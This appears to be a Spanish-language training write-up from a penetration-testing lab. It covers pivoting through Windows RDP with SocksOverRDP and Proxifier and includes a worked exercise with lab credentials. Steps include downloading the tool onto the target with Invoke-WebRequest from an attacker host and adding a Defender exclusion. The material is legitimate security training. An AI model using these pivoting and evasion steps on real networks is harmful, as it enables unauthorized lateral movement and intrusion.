
# RDP y SOCKS Tunneling con SocksOverRDP

A menudo, durante una evaluación, hay momentos en los que podemos estar limitados a una red de Windows y es posible que no podamos usar SSH para pivotar. Tendríamos que utilizar herramientas disponibles para sistemas operativos Windows en estos casos. [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) es un ejemplo de una herramienta que utiliza `Dynamic Virtual Channels`( `DVC`) de la función Servicio de Escritorio remoto de Windows. DVC es responsable de tunelizar los paquetes a través de la conexión RDP. Algunos ejemplos de uso de esta función serían la transferencia de datos del portapapeles y el uso compartido de audio. Sin embargo, esta característica también se puede utilizar para canalizar paquetes arbitrarios a través de la red. Podemos utilizarlo `SocksOverRDP`para hacer un túnel con nuestros paquetes personalizados y luego utilizarlos como proxy. Usaremos la herramienta [Proxifier](https://www.proxifier.com/) como nuestro servidor proxy.

Podemos comenzar descargando los binarios apropiados en nuestro host de ataque para realizar este ataque. Tener los binarios en nuestro host de ataque nos permitirá transferirlos a cada objetivo cuando sea necesario. Necesitaremos:

1. [Binarios SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases)
2. [Proxifier binario portátil](https://www.proxifier.com/download/#win-tab)

* Podemos buscar `ProxifierPE.zip`

Luego podemos conectarnos al destino usando xfreerdp y copiar el archivo `SocksOverRDPx64.zip` al destino. Desde el destino de Windows, necesitaremos cargar SocksOverRDP.dll usando regsvr32.exe.

### **Cargando SocksOverRDP.dll usando regsvr32.exe**

```powershell
C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

![](https://academy.hackthebox.com/storage/modules/158/socksoverrdpdll.png)

Ahora podemos conectarnos a `172.16.5.19` a través de RDP usando `mstsc.exe` y deberíamos recibir un mensaje indicando que el complemento SocksOverRDP está habilitado y escuchará en `127.0.0.1:1080`. Podemos usar las credenciales `victor:pass@123`para conectarnos a `172.16.5.19`

![](https://academy.hackthebox.com/storage/modules/158/pivotingtoDC.png)

Necesitaremos transferir SocksOverRDPx64.zip o simplemente `SocksOverRDP-Server.exe` a `172.16.5.19`. Luego podemos iniciar SocksOverRDP-Server.exe con privilegios de administrador.

![](https://academy.hackthebox.com/storage/modules/158/executingsocksoverrdpserver.png)

Cuando volvamos a nuestro punto de apoyo (Host de pivoting) y verifiquemos con Netstat, deberíamos ver que nuestro oyente SOCKS comenzó en `127.0.0.1:1080`.

### **Confirmación de que se inicia el oyente SOCKS**

```cmd-session
C:\Users\htb-student\Desktop\SocksOverRDP-x64> ls

  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
```

Después de iniciar nuestro oyente, podemos transferir Proxifier portable al destino de Windows 10 (en la red 10.129.xx) y configurarlo para reenviar todos nuestros paquetes a `127.0.0.1:1080`. Proxifier enrutará el tráfico a través del host y puerto indicados. Vea el clip a continuación para ver un tutorial rápido sobre la configuración de Proxifier.

### **Configurar el proxy**

![](https://academy.hackthebox.com/storage/modules/158/configuringproxifier.gif)

Con Proxifier configurado y en ejecución, podemos iniciar `mstsc.exe`, y usará Proxifier para pivotar todo nuestro tráfico a través de `127.0.0.1:1080`, lo que lo canalizará a través de RDP hasta `172.16.5.19`, que luego lo enrutará a `172.16.6.155` usando SocksOverRDP-server.exe.

![](https://academy.hackthebox.com/storage/modules/158/rdpsockspivot.png)

### **Consideraciones de rendimiento del RDP**

Al interactuar con nuestras sesiones de RDP en un compromiso, es posible que nos encontremos con un rendimiento lento en una sesión determinada, especialmente si administramos varias sesiones de RDP simultáneamente. Si este es el caso, podemos acceder a la pestaña `Experience` en mstsc.exe y configurar la `Performance` en `Modem`.

![](https://academy.hackthebox.com/storage/modules/158/rdpexpen.png)

***

## <mark style="color:purple;">Caso práctico</mark>

Utiliza los conceptos que se enseñan en esta sección para pivotar al servidor de Windows en `172.16.6.155` (`jason:WellConnected123!`). Envíe el contenido de Flag.txt en el escritorio de Jason.

```
RDP a 10.129.42.198 (ACADEMY-PIVOTING-WIN10PIV)
Usuario "htb-student" 
Contraseña "HTB_@cademy_stdnt!"
```

### Paso 1: Conexión por RDP al host

```shell-session
afsh4ck@kali$ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
```

### Paso 2: Descarga de binarios en host de atacante

* [Binarios SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases)
* [Proxifier binario portátil](https://www.proxifier.com/download/#win-tab)

### Paso 3: Envio de los binarios al host Windows

En la carpeta de los programas de nuestro Kali Linux:

```
python3 -m http.server 80
```

En el Windows objetivo abrimos un navegador en nuestra IP:

<figure><img src="/files/oqWNFWC7eG6oijHM4xac" alt=""><figcaption></figcaption></figure>

O con Invoke-WebRequest:

```
Invoke-WebRequest -Uri 'http://10.10.15.249:80/Proxifier PE' -OutFile 'Proxifier PE'
```

```
Invoke-WebRequest -Uri 'http://10.10.15.249:80/SocksOverRDP-Plugin.dll' -OutFile 'SocksOverRDP-Plugin.dll'
```

El archivo .dll es bloqueado por Defender ya que lo considera un virus, asi que tenemos que añadir la excepción manualmente para que no lo elimine del sistema.

### Paso 4: **Cargamos SocksOverRDP.dll usando regsvr32.exe**

```
C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

<figure><img src="/files/OLMVADoa6g3JjbYIQrjt" alt=""><figcaption></figcaption></figure>

### Paso 5: Conectarse al servidor `172.16.6.155` utilizando mstsc.exe

1. **Abrir `mstsc.exe`** (Remote Desktop Connection):

* Presiona `Win + R`, escribe `mstsc` y presiona `Enter`.

2. **Ingresar la dirección del servidor**:

* En el campo "Computer", ingresa `172.16.6.155`

3. **Configurar las opciones de conexión**:

* Haz clic en "Show Options".
* En "User name", ingresamos `jason`

<figure><img src="/files/2BUGWN8iLbSbsLqU36wd" alt=""><figcaption></figcaption></figure>

4. **Conectar al servidor**:

* Haz clic en "Connect".

Le damos a OK y introducimos las credenciales de jason: `WellConnected123!`

No nos deja acceder directamente, asi que vamos a configurar el proxy

### Paso 6: Configuramos el Proxy

<figure><img src="/files/VUvJyH5bMDJjmKU7XEmU" alt=""><figcaption></figcaption></figure>

### Paso 7: Conexión al objetivo

Nos conectamos con mstsc.exe y accedemos correctamente al objetivo 🏆

<figure><img src="/files/KHQRZDG2HsrjXwzPCSD4" alt=""><figcaption></figcaption></figure>
